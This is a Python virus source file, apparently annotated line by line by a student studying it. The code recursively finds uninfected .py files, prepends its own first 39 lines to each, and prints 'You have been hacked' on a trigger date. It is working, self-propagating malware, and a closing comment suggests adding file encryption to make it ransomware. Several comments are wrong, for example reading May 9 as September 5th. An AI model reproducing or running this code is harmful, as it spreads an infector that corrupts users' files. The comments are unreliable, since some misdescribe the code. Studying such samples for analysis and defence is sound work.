#!/usr/bin/python
import os
import datetime

SIGNATURE = "VIRUS"

def locate(path): #function definition taking a path argument
    files_targeted = [] #instantiating an empty array of presumably files targetted
    filelist = os.listdir(path) #listdir will return all files and directories located in the directory the path variable leads us to.
    for fname in filelist: #starts a for loop where each file in filelist is represented as fname in the following code.
        if os.path.isdir(path+"/"+fname): #checks if the item at fname is a directory
            files_targeted.extend(locate(path+"/"+fname)) #IF fname is a directory (that was last line) do a thing. Recursion makes me think whatever we're doing is going to be very nasty.
        elif fname[-3:] == ".py": #IF fname is not a directory, and it IS a python file do this
            infected = False #sets the newly instantiated infected variable to false
            for line in open(path+"/"+fname): #opens the fname file and runs the following code on each line
                if SIGNATURE in line: #IF the line contains the string VIRUS do the following
                    infected = True #set the infected variable to true
                    break #quit the for loop and move on.
            if infected == False: # after we have verified if fname is infected or not, if it's NOT infected do this
                files_targeted.append(path+"/"+fname) # add fname to the targeted_files variable.
    return files_targeted # return all the files_targeted.

def infect(files_targeted): # function definition taking one argument
    virus = open(os.path.abspath(__file__)) # opens the file currently saved to the __file__ variable (looked at this for a second, appears to either be THIS file, or the datetime since that was imported second. THIS file seems more likely. Could potentially be neither.)
    virusstring = "" #sets the virusstring variable to an empty string
    for i,line in enumerate(virus): # numbers each line in virus
        if 0 <= i < 39: #if we're on the first 40 lines do something
            virusstring += line # adds each line of the first 40 lines of code to our virusstring variable.
    virus.close # closes the file, docs say file will be unable to be read or written to afterwards.
    for fname in files_targeted: # FOR each fname FILE in our files_targeted variable DP
        f = open(fname) #open the file and set the return to our F variable
        temp = f.read() #read the file and save all its contents to the temp variable
        f.close() #close the file so it cannot be read or written to anymore
        f = open(fname,"w") #opens the file, the "w" is an argument that specifies open for writing
        f.write(virusstring + temp) #oh no. Not sure of the base functionality of .write is, so I'm assuming overwrite. Will change the contents of our file to the contents and virusstring, breaking everything.
        f.close() #close the file so it cannot be read or written to anymore.

def detonate(): #sets the program to explode. Probably. Idk yet.
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: # if it's september 5th do something.
        print "You have been hacked" # Supposed to print "You have been hacked" somewhere. Also this line causes a syntax error preventing the program from proceeding. Is this accidental or to keep students from accidentally running the program?

files_targeted = locate(os.path.abspath("")) #Targets files starting from the home directory I think.
infect(files_targeted) # Runs the infect function on all files stored in files_targetted
detonate() #prints you have been hacked to the console, but only on september fifth.

# For this script, python utilizes the os methods isdir, listdir, and abspath.
# It also utilizes the datetime method now for the day and month properties.
# The array methods extend and append.
# The function open, and the file methods read, write, and close.

# Could be ransomware? if the __file__ variable (property?) is THIS file, then the actual contents of this file seem easy enough to remove, if you can do the hard part of getting another computer to run the program.

# The more I think about this the more different answers I have. If this IS intended to be ransomware, I would figure out how to encrpyt a few files after completing everything else to make it much more annoying.